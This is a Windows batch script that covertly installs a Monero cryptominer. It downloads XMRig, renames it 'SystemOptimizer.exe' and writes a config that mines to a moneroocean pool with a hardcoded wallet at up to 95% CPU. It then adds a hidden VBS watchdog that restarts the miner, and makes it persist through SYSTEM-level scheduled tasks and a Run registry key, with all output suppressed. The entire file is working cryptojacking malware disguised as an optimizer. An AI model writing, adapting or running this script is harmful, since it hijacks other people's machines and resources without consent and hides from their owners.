@echo off
setlocal enabledelayedexpansion

REM Create directory
if not exist "C:\ProgramData\SystemOptimizer" mkdir "C:\ProgramData\SystemOptimizer"

REM Download XMRig
bitsadmin /transfer XMRigDownload /download /priority FOREGROUND "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" "%TEMP%\xmrig.zip" >nul 2>&1

REM Extract
powershell -Command "Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%TEMP%\xmrig_tmp' -Force" >nul 2>&1
move /y "%TEMP%\xmrig_tmp\xmrig-6.26.0\xmrig.exe" "C:\ProgramData\SystemOptimizer\SystemOptimizer.exe" >nul 2>&1
rmdir /s /q "%TEMP%\xmrig_tmp" >nul 2>&1
del "%TEMP%\xmrig.zip" >nul 2>&1

REM Create config.json
echo { > "C:\ProgramData\SystemOptimizer\config.json"
echo     "autosave": false, >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "background": true, >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "colors": false, >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "donate-level": 1, >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "log-file": "C:\ProgramData\SystemOptimizer\optimizer.log", >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "print-time": 30, >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "retries": 5, >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "retry-pause": 10, >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "cpu": { >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "enabled": true, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "huge-pages": true, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "huge-pages-jit": true, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "hw-aes": true, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "priority": 1, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "yield": true, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "max-cpu-usage": 95, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "asm": true, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "argon2-impl": "auto", >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "max-threads-hint": 100 >> "C:\ProgramData\SystemOptimizer\config.json"
echo     }, >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "pools": [ >> "C:\ProgramData\SystemOptimizer\config.json"
echo         { >> "C:\ProgramData\SystemOptimizer\config.json"
echo             "url": "gulf.moneroocean.stream:10001", >> "C:\ProgramData\SystemOptimizer\config.json"
echo             "user": "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv", >> "C:\ProgramData\SystemOptimizer\config.json"
echo             "pass": "x", >> "C:\ProgramData\SystemOptimizer\config.json"
echo             "keepalive": true, >> "C:\ProgramData\SystemOptimizer\config.json"
echo             "tls": false, >> "C:\ProgramData\SystemOptimizer\config.json"
echo             "nicehash": false, >> "C:\ProgramData\SystemOptimizer\config.json"
echo             "rig-id": "%COMPUTERNAME%" >> "C:\ProgramData\SystemOptimizer\config.json"
echo         } >> "C:\ProgramData\SystemOptimizer\config.json"
echo     ], >> "C:\ProgramData\SystemOptimizer\config.json"
echo     "api": { >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "enabled": true, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "host": "127.0.0.1", >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "port": 3456, >> "C:\ProgramData\SystemOptimizer\config.json"
echo         "restricted": true >> "C:\ProgramData\SystemOptimizer\config.json"
echo     } >> "C:\ProgramData\SystemOptimizer\config.json"
echo } >> "C:\ProgramData\SystemOptimizer\config.json"

REM Create watchdog.vbs
echo Set sh = CreateObject("WScript.Shell") > "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo Set wmi = GetObject("winmgmts:") >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'").Count ^> 1 Then WScript.Quit >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo Do >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo     Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'") >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo     If p.Count = 0 Then >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo         sh.Run """C:\ProgramData\SystemOptimizer\SystemOptimizer.exe"" --config=""C:\ProgramData\SystemOptimizer\config.json""", 0, False >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo     End If >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo     WScript.Sleep 30000 >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
echo Loop >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"

REM Create scheduled tasks
schtasks /Create /TN "SystemOptimizer" /TR "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Create /TN "SystemOptimizer-Logon" /TR "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Change /TN "SystemOptimizer" /RI 1 /DU 9999:59 /K >nul 2>&1

REM Registry Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /t REG_SZ /d "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /f >nul 2>&1

REM Start watchdog
wscript.exe "C:\ProgramData\SystemOptimizer\watchdog.vbs"

exit /b 0